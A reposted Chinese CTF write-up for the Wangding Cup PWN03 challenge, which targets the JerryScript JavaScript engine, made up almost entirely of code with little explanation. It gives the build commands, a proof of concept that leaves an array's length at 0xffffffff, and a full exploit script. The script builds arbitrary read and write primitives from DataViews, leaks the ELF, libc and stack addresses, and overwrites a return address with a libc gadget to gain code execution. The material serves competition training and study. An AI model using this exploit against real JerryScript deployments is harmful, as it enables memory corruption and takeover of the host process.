# 网鼎杯青龙组的 PWN03 Jerryscript 题目

> 原文: https://www.ctfiot.com/215340.html
> ID: 215340


```
git clone https://github.com/jerryscript-project/jerryscript.gitgit checkout d7e21259fe330acf393d1c0bfbd60dfcbe23b6ba
```



```
python3 ./tools/build.py --strip=onpython3 ./tools/build.py  --clean --compile-flag=-g --strip=off
```



```
// jerryscriptjerry-coreecmabuiltin-objectsecma-builtin-array-prototype.cecma_value_tecma_builtin_array_prototype_dispatch_routine (...){...      switch (builtin_routine_id)  {...    case ECMA_ARRAY_PROTOTYPE_POP: // 5    {      ret_value = ecma_builtin_array_prototype_object_pop (obj_p, length);      break;    }
```



```
let a = [1,1,1,1,1,1,1,1]a.pop()print(a.length)// 4294967295=0xffffffff
```



```
0x4f572: jerryx_print_value0x53739: ecma_builtin_array_prototype_object_pop
```



```
let a = [0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31];a1 = new ArrayBuffer(0x1000);d1 = new DataView(a1);d1.setUint32(0, 0x41414141, true);a2 = new ArrayBuffer(0x1000);d2 = new DataView(a2);d2.setUint32(0, 0x42424242, true);a.pop();
```



```
>>> hex(0x000055555566c1c0+(0x5b<<3))'0x55555566c498'
```



```
let a = [0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31];a1 = new ArrayBuffer(0x1000);d1 = new DataView(a1);d1.setUint32(0, 0x41414141, true);a2 = new ArrayBuffer(0x1000);d2 = new DataView(a2);d2.setUint32(0, 0x42424242, true);a.pop();aa = 11print(a[242]);// $ ./pwn poc.js// 89549968
```



```
function hex(i){return "0x" + i.toString(16).padStart(16, '0');}function aar(addr, dv1, dv2){    dv1.setBigUint64(0, addr, true);    if(dv2.buffer){        return dv2.getBigUint64(0, true);    }    return 0;}function aaw(addr, value, dv1, dv2){    dv1.setBigUint64(0, addr, true);    dv2.setBigUint64(0, value, true);}let a = [0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31];a1 = new ArrayBuffer(0x1000);d1 = new DataView(a1);d1.setUint32(0, 0x41414141, true);a2 = new ArrayBuffer(0x1000);d2 = new DataView(a2);d2.setUint32(0, 0x42424242, true);a.pop();var offset = a[242] - 0x3c;a[242] = offset;buffer_p = Number(d1.getBigUint64(0, true))elf_base = buffer_p - 0x26db80;print(hex(elf_base))free_got            = Number(aar(elf_base + 0x26adf8, d1, d2));libc_base           = free_got - 0x97910;environ             = libc_base + 0x61c118;stack               = Number(aar(environ, d1, d2));libc_start_main_ret = stack - 0xf8;aaw(libc_start_main_ret, libc_base + 0x10a2fc, d1, d2);aar(environ, d1, d2)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/0-1731557780.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/0-1731557781.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/5-1731557782.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/0-1731557782.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/4-1731557784.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/1-1731557785.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/10-1731557786.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/0-1731557786.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/5-1731557787.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/8-1731557788.png)